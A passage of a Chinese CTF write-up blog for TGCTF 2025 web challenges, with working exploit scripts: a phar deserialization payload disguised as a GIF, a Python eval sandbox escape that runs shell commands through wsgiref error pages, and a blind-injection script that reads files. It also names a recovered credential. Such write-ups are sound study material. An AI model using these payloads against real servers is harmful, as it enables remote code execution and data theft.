class="variable">$useful20</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yesterday</span>();</span><br><span class="line"><span class="variable">$aa</span>-&gt;study = <span class="keyword">new</span> <span class="title function_ invoke__">today</span>();</span><br><span class="line"><span class="variable">$aa</span>-&gt;study-&gt;doing = <span class="keyword">new</span> <span class="title function_ invoke__">future</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;sauy.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$aa</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>php -d phar.readonly=0 -f explore.php</code></p>
<p>将生成的sauy.php改为atg 上传成功后 到class.php 进行反序列化操作</p>
<p>get传入：?filename&#x3D;phar:&#x2F;&#x2F;.&#x2F;uploads&#x2F;sauy.atg&#x2F;test.txt</p>
<p>post传入：wow&#x3D;env</p>
<h2 id="熟悉的配方，熟悉的味道"><a href="#熟悉的配方，熟悉的味道" class="headerlink" title="熟悉的配方，熟悉的味道"></a><strong>熟悉的配方，熟悉的味道</strong></h2><p>进去即使源代码贴脸 但是可惜我不会 赛后复现算是学到了 谢谢实验室的佬大教我</p>
<p>考点：沙箱绕过 python代码注入</p>
<p>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyramid.config <span class="keyword">import</span> Configurator</span><br><span class="line"><span class="keyword">from</span> pyramid.request <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> pyramid.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> pyramid.view <span class="keyword">import</span> view_config</span><br><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"><span class="keyword">from</span> pyramid.events <span class="keyword">import</span> NewResponse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, BaseLoader</span><br><span class="line"></span><br><span class="line">eval_globals = &#123; <span class="comment">#防止eval执行恶意代码</span></span><br><span class="line">    <span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;,      <span class="comment"># 禁用所有内置函数</span></span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>: <span class="literal">None</span>       <span class="comment"># 禁止动态导入</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkExpr</span>(<span class="params">expr_input</span>):</span><br><span class="line">    expr = re.split(<span class="string">r&quot;[-+*/]&quot;</span>, expr_input)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">exec</span>(expr_input))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(expr) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home_view</span>(<span class="params">request</span>):</span><br><span class="line">    expr_input = <span class="string">&quot;&quot;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        expr_input = request.POST[<span class="string">&#x27;expr&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> checkExpr(expr_input):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = <span class="built_in">eval</span>(expr_input, eval_globals)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                result = e</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="string">&quot;爬！&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    template_str = 【xxx】</span><br><span class="line"></span><br><span class="line">    env = Environment(loader=BaseLoader())</span><br><span class="line">    template = env.from_string(template_str)</span><br><span class="line">    rendered = template.render(expr_input=expr_input, result=result)</span><br><span class="line">    <span class="keyword">return</span> Response(rendered)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> Configurator() <span class="keyword">as</span> config:</span><br><span class="line">        config.add_route(<span class="string">&#x27;home_view&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        config.add_view(home_view, route_name=<span class="string">&#x27;home_view&#x27;</span>)</span><br><span class="line">        app = config.make_wsgi_app()</span><br><span class="line"></span><br><span class="line">    server = make_server(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9040</span>, app)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<h3 id="法1：用抛出错误实现RCE，用污染HTTP-500的返回消息实现回显"><a href="#法1：用抛出错误实现RCE，用污染HTTP-500的返回消息实现回显" class="headerlink" title="法1：用抛出错误实现RCE，用污染HTTP 500的返回消息实现回显"></a>法1：用抛出错误实现RCE，用污染HTTP 500的返回消息实现回显</h3><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>看不懂问ai</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;your_url&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b = re.match.__globals__[&#x27;__builtins__&#x27;]</span></span><br><span class="line"><span class="string">b[&quot;setattr&quot;](b[&#x27;__import__&#x27;](&#x27;wsgiref&#x27;).handlers.BaseHandler,&quot;error_body&quot;,b[&quot;__import__&quot;](&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read().encode())</span></span><br><span class="line"><span class="string">raise Exception(&quot;1&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">resp = requests.post(url, data = &#123;</span><br><span class="line">    <span class="string">&quot;expr&quot;</span>: <span class="string">f&quot;exec(<span class="subst">&#123;code!r&#125;</span>)&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.status_code)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>

<h4 id="脚本解释"><a href="#脚本解释" class="headerlink" title="脚本解释"></a>脚本解释</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先通过 b = re.match.__globals__[&#x27;__builtins__&#x27;] 这一步是通过加载__globals__的属性访问全局空间 目的是绕过对__import__和__builtins__的限制 相当于绕过对这个的沙箱限制</span><br><span class="line"></span><br><span class="line">然后 b[&quot;setattr&quot;](b[&#x27;__import__&#x27;](&#x27;wsgiref&#x27;).handlers.BaseHandler,&quot;error_body&quot; 是过__import__函数动态加载wsgiref模块wsgiref.handlers.BaseHandler是WSGI处理HTTP请求/响应的基类，负责生成错误响应内容。</span><br><span class="line"></span><br><span class="line">b[&quot;__import__&quot;](&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read().encode() 然后修改类的error_body属性为命令执行的内容 然后encode是把其转化为字节类型</span><br><span class="line"></span><br><span class="line">raise Exception(&quot;1&quot;)是强制抛出异常 触发WSGI报错</span><br></pre></td></tr></table></figure>

<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>通过故意触发程序中的异常（错误），利用异常处理机制中的漏洞执行恶意代码。例如，在动态代码执行环境（如<code>eval</code>）中，攻击者构造输入引发异常，同时注入恶意代码。</p>
<h4 id="做题思考步骤："><a href="#做题思考步骤：" class="headerlink" title="做题思考步骤："></a>做题思考步骤：</h4><ol>
<li><strong>输入构造</strong>：提交包含恶意代码的输入，如<code>1 + &quot;a&quot;</code>引发类型错误。</li>
<li><strong>异常触发</strong>：服务器处理输入时抛出异常，进入错误处理流程。</li>
<li><strong>代码注入</strong>：在异常处理过程中，恶意代码被解析执行。例如，通过<code>__import__(&#39;os&#39;).system(&#39;ls&#39;)</code>执行系统命令。</li>
<li><strong>绕过限制</strong>：利用反射或内置对象（如<code>__builtins__</code>）绕过沙箱限制，实现任意代码执行。</li>
</ol>
<h4 id="法2：布尔盲注"><a href="#法2：布尔盲注" class="headerlink" title="法2：布尔盲注"></a>法2：布尔盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag),<span class="number">50</span>):</span><br><span class="line">    <span class="comment"># for s in &#x27;TGCTF&#123;&#x27;:</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> tqdm(<span class="string">&#x27;-&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+string.ascii_lowercase+string.digits):</span><br><span class="line">        data = &#123;<span class="string">&quot;expr&quot;</span>:<span class="string">f&quot;import os,operator;f=os.popen(&#x27;cat /f*&#x27;).read();a=int(operator.eq(f[<span class="subst">&#123;i&#125;</span>],&#x27;<span class="subst">&#123;s&#125;</span>&#x27;));1/a&quot;</span>&#125;</span><br><span class="line">        <span class="comment"># res = requests.post(url, data=json)</span></span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(res.text, s)</span></span><br><span class="line">        <span class="keyword">if</span> res.text != <span class="string">&quot;A server error occurred.  Please contact the administrator.&quot;</span>:</span><br><span class="line">            flag += s</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)s</span><br></pre></td></tr></table></figure>

<h4 id="法3：pyramid内存马"><a href="#法3：pyramid内存马" class="headerlink" title="法3：pyramid内存马"></a>法3：pyramid内存马</h4><p>推荐这篇师傅的文章捏 <code>https://www.yuque.com/polestar-mzvgl/swtget/zuh78rfp7i67u219#AWd8j</code></p>
<p>也可以看我的博客内置文章 <a target="_blank" rel="noopener" href="https://sauy122.github.io/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">https://sauy122.github.io/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</a></p>
<h2 id="TG-wordpress"><a href="#TG-wordpress" class="headerlink" title="TG_wordpress"></a><strong>TG_wordpress</strong></h2><p>有很多漏洞点 治理只写一种</p>
<p>扫描二维码下下来一个apk文件 jadx反编译后 全局搜索 password</p>
<p><img src="/images/image-20250415210925462.png" alt="image-20250415210925462"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;string name=<span class="string">&quot;web04&quot;</span>&gt;+ username/password:&lt;/string&gt;</span><br><span class="line">&lt;string name=<span class="string">&quot;web05&quot;</span>&gt;+ TG_wordpressor&lt;/string&gt;</span><br><span class="line">&lt;string name=<span class="string">&quot;web06&quot;</span>&gt;+ aXx^oV<span class="meta">@K</span>&amp;amp;cFoVaztQ*&lt;/string&gt;</span><br></pre></td></tr></table></figure>

<p>在&#x2F;login路由登录 进入过后 查询插件确定cve 的型号(你可也直接复制插件的内容 然后直接问dp)</p>
<p>TGCTF{CVE-2020-25213}</p>
<h2 id="TGCTF-2025-后台管理"><a href="#TGCTF-2025-后台管理" class="headerlink" title="TGCTF 2025 后台管理"></a><strong>TGCTF 2025 后台管理</strong></h2><p>SQL注入</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/04/14/TGCTF2025-WEB/" data-id="cmaatsm96000b60dmbg81ebto" data-title="TGCTF2025-WEB WP" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-wp/" rel="tag">CTF-wp</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">前一篇</strong>
      <div class="article-nav-title">
        
          浅谈python内存马
        
      </div>
    </a>
  
  
    <a href="/2025/04/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">后一篇</strong>
      <div class="article-nav-title">pickle反序列化学习</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-wp/" rel="tag">CTF-wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E5%AD%A6%E4%B9%A0/" rel="tag">CTF学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" rel="tag">渗透学习</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF-wp/" style="font-size: 20px;">CTF-wp</a> <a href="/tags/CTF%E5%AD%A6%E4%B9%A0/" style="font-size: 20px;">CTF学习</a> <a href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">渗透学习</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">五月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">四月 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/05/05/2025-05-05-HTB-Heal/">HTB-Heal</a>
          </li>
        
          <li>
            <a href="/2025/04/27/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">CBC字节翻转攻击</a>
          </li>
        
          <li>
            <a href="/2025/04/24/HTB-Practice/">HTB-Code</a>
          </li>
        
          <li>
            <a href="/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">浅谈python内存马</a>
          </li>
        
          <li>
            <a href="/2025/04/14/TGCTF2025-WEB/">TGCTF2025-WEB WP</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 Sauy<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>